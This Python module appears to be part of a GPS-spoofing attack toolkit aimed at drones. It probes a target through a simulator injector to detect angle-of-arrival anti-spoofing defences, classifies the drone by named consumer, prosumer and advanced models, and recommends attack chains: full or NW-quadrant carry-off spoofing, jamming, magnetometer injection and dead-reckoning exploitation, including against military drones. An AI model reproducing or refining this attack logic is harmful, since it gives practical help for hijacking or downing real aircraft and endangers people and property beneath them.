"""
probe_detector.py
=================
AoA capability detection via probe signal test.

Updated strategy: AoA is countered by selective satellite
spoofing (NW quadrant only) NOT by jamming. Jamming is only
the fallback if selective spoofing fails.
"""

import time
import logging


class ProbeDetector:
    """
    Detects AoA capability before committing to full attack.

    Sends brief low-power probe, monitors telemetry response.
    Routes to correct countermeasure based on detection result.

    AoA countermeasure decision tree:
    - No AoA detected: full direct spoofing all satellites
    - AoA detected: selective NW-quadrant spoofing (primary)
    - Selective spoofing fails: jamming + magnetometer (fallback)
    - Military drone continues on IMU: dead reckoning exploitation
    """

    def __init__(self, config):
        self.config = config
        self.aoa_detected = False
        self.target_classification = 'unknown'
        self.logger = logging.getLogger('ProbeDetector')

    def run_probe_test(self, sitl_injector, duration_s=2.0):
        """
        Send brief probe GPS injection and monitor response.

        Looks for behavioral changes indicating AoA awareness:
        - Heading correction > 0.5 degrees
        - Altitude hold command
        - GPS quality flag change
        - Any telemetry anomaly

        Args:
            sitl_injector: SITLInjector instance
            duration_s: observation window in seconds

        Returns:
            (aoa_detected, confidence, evidence)
        """
        print(f"\n[PROBE] Running AoA detection probe ({duration_s}s)...")

        baseline = sitl_injector.read_telemetry()
        baseline_heading = baseline.get('heading', 0.0) if baseline else 0.0

        sitl_injector.inject_gps(
            lat=self.config['mission']['start_lat'] + 0.00001,
            lon=self.config['mission']['start_lon'],
            alt=self.config['mission']['start_alt'],
            satellites=8,
            hdop=1.2
        )

        time.sleep(duration_s)

        response = sitl_injector.read_telemetry()

        if response is None:
            print(f"[PROBE] No telemetry — assuming no AoA (simulation mode)")
            self.aoa_detected = False
            return False, 0.3, 'no_telemetry'

        heading_change = abs(
            response.get('heading', 0.0) - baseline_heading)
        gps_flag_change = (
            response.get('gps_fix', 3) != baseline.get('gps_fix', 3)
            if baseline else False
        )

        evidence_list = []
        confidence = 0.0

        if heading_change > 0.5:
            evidence_list.append(
                f'heading_change={heading_change:.2f}deg')
            confidence += 0.4

        if gps_flag_change:
            evidence_list.append('gps_flag_changed')
            confidence += 0.3

        if response.get('ekf_flags', 0) != baseline.get('ekf_flags', 0):
            evidence_list.append('ekf_flags_changed')
            confidence += 0.3

        self.aoa_detected = confidence > 0.3
        evidence = ', '.join(evidence_list) if evidence_list else 'no_response'

        status = "DETECTED" if self.aoa_detected else "NOT DETECTED"
        print(f"[PROBE] AoA: {status} (confidence={confidence:.0%})")
        print(f"[PROBE] Evidence: {evidence}")

        return self.aoa_detected, confidence, evidence

    def classify_target(self, drone_model=None, probe_result=None):
        """
        Classify target drone capability level.

        Args:
            drone_model: identified drone model string or None
            probe_result: result from run_probe_test() or None

        Returns:
            classification string
        """
        aoa_present = probe_result[0] if probe_result else self.aoa_detected

        consumer_models = [
            'dji_mini', 'mavic_mini', 'phantom', 'spark',
            'tello', 'holy_stone', 'syma'
        ]
        prosumer_models = [
            'mavic_pro', 'mavic_air', 'mavic_3', 'autel_evo',
            'skydio_2', 'parrot_anafi'
        ]
        advanced_models = [
            'matrice', 'inspire', 'agras', 'autel_dragonfish',
            'wingtra', 'quantum_systems'
        ]

        if drone_model:
            model_lower = drone_model.lower()
            if any(m in model_lower for m in consumer_models):
                classification = 'consumer'
            elif any(m in model_lower for m in prosumer_models):
                classification = 'prosumer'
            elif any(m in model_lower for m in advanced_models):
                classification = 'advanced'
            else:
                classification = 'unknown'
        else:
            classification = 'unknown'

        if aoa_present and classification in ['unknown', 'consumer']:
            classification = 'advanced'

        self.target_classification = classification

        print(f"[PROBE] Target classification: {classification.upper()}")

        return classification

    def recommend_attack(self, classification=None):
        """
        Recommend attack method based on target classification.

        IMPORTANT: AoA is now countered by selective NW-quadrant
        spoofing as primary method. Jamming is fallback only.

        Returns:
            dict with primary and fallback attack methods
        """
        if classification is None:
            classification = self.target_classification

        recommendations = {
            'consumer': {
                'primary': 'carry_off_all_satellites',
                'aoa_present': 'carry_off_selective_nw',
                'fallback': 'jam_then_magnetometer',
                'description': (
                    'No AoA — spoof all satellites. '
                    'If AoA somehow present use NW selective.'
                )
            },
            'prosumer': {
                'primary': 'carry_off_selective_nw',
                'aoa_present': 'carry_off_selective_nw',
                'fallback': 'jam_then_dead_reckoning_exploit',
                'description': (
                    'Possible dual antenna — use NW selective spoofing. '
                    'Signals arrive from plausible sky direction.'
                )
            },
            'advanced': {
                'primary': 'carry_off_selective_nw',
                'aoa_present': 'carry_off_selective_nw',
                'fallback': 'jam_then_magnetometer',
                'description': (
                    'CRPA likely — NW selective spoofing creates '
                    'geometric dilemma for null steering. '
                    'Fallback: jam + magnetometer heading control.'
                )
            },
            'military': {
                'primary': 'carry_off_selective_nw',
                'aoa_present': 'jam_then_dead_reckoning_exploit',
                'fallback': 'magnetometer_only',
                'description': (
                    'Full CRPA + INS — selective spoofing may fail. '
                    'Jam then exploit dead reckoning error window. '
                    'Magnetometer injection as parallel track.'
                )
            },
            'unknown': {
                'primary': 'carry_off_selective_nw',
                'aoa_present': 'carry_off_selective_nw',
                'fallback': 'jam_then_magnetometer',
                'description': 'Unknown class — use safest approach.'
            }
        }

        rec = recommendations.get(
            classification, recommendations['unknown'])

        print(f"[PROBE] Attack recommendation for {classification}:")
        print(f"  Primary: {rec['primary']}")
        print(f"  If AoA: {rec['aoa_present']}")
        print(f"  Fallback: {rec['fallback']}")
        print(f"  Reason: {rec['description']}")

        return rec